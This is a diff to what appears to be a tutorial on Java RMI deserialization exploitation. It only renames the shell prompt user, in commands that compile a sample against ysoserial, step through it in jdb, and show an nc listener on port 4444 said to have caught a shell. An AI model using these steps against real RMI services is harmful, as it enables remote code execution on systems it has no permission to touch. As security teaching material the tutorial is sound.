@@ -610,8 +610,8 @@ Now we need to compile ``ISecureServerLoginSample.java`` with ``ysoserial`` with
 we can run the sample within *jdb*.
 
 ```console
-[pentester@kali ISecureServerLoginSample]$ javac -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT.jar:. ISecureServerLoginSample.java 
-[pentester@kali ISecureServerLoginSample]$ jdb -classpath /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar:. ISecureServerLoginSample
+[qtc@kali ISecureServerLoginSample]$ javac -cp /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT.jar:. ISecureServerLoginSample.java 
+[qtc@kali ISecureServerLoginSample]$ jdb -classpath /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar:. ISecureServerLoginSample
 Initializing jdb ...
 
 > stop in java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod
@@ -655,7 +655,7 @@ As expected, we get an ``IllegalArgumentException``. However, at this point the 
 and we obtained a shell on our *nc* listener:
 
 ```console
-[pentester@kali ~]$ nc -vlp 4444
+[qtc@kali ~]$ nc -vlp 4444
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
